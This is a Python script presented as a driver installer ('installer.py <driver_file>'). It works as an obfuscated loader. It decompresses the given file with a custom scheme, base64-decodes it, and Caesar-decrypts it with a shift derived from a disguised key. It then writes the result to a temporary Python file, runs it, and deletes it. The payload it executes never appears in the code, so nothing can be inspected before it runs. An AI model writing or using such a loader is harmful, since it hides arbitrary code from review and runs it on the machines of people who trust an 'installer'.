import sys
import base64
import struct
import os
import subprocess
import tempfile

def decompress_bytes_to_text(data: bytes) -> str:
    return decompress(data)

def decompress(data_bytes: bytes) -> str:
    output = []
    i = 0
    while i < len(data_bytes):
        offset, length, char = struct.unpack('>HBc', data_bytes[i:i+4])
        i += 4

        if offset == 0 and length == 0:
            output.append(char.decode('latin1'))
        else:
            start = len(output) - offset
            for j in range(length):
                output.append(output[start + j])
            output.append(char.decode('latin1'))

    return ''.join(output)

def calculate_shift(key, mult):
    shift = int(key) / int(mult)
    shift_str = str(int(shift))
    shift_bytes = shift_str.encode("utf-8")
    encoded_bytes = base64.b64encode(shift_bytes)
    return encoded_bytes

def get_shift_from_b64(shift_b64):
    shift_bytes = base64.b64decode(shift_b64)
    shift_int = int(shift_bytes.decode("utf-8"))
    return shift_int

def autocrack(encrypted_key, multiplier):
    decoded_bytes = base64.b64decode(encrypted_key)
    original_key = decoded_bytes.decode("utf-8")
    shift_b64 = calculate_shift(int(original_key), multiplier)
    shift_value = get_shift_from_b64(shift_b64)
    return shift_value

def decrypt(text, shift):
    text_bytes = base64.b64decode(text)
    text_plain = text_bytes.decode("utf-8")
    text = str(text_plain)
    decrypted = ""
    for char in text:
        if char.isalpha():
            start = 65 if char.isupper() else 97
            decrypted += chr((ord(char) - start - shift) % 26 + start)
        else:
            decrypted += char
    return decrypted

# ==== START: Argument Parsing ====

if len(sys.argv) < 2:
    print("Usage: python installer.py <driver_file>")
    sys.exit(1)

driver_file = sys.argv[1]

if not os.path.isfile(driver_file):
    print(f"Error: File '{driver_file}' does not exist.")
    sys.exit(1)

# ==== END: Argument Parsing ====

with open(driver_file, "rb") as f:
    compressed_data = f.read()

text = decompress_bytes_to_text(compressed_data)

# Decryption process
key = "Mjg0NzM4NjM="  # base64 encoded key
mult = 7417
shift = autocrack(key, mult)

decrypted_file = decrypt(text, shift)

with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py", encoding="utf-8") as temp_file:
    temp_file.write(decrypted_file)
    temp_filename = temp_file.name


try:
    subprocess.run([sys.executable, temp_filename], check=True, stdin=sys.stdin, stdout=sys.stdout, stderr=sys.stderr)
finally:
    os.remove(temp_filename)
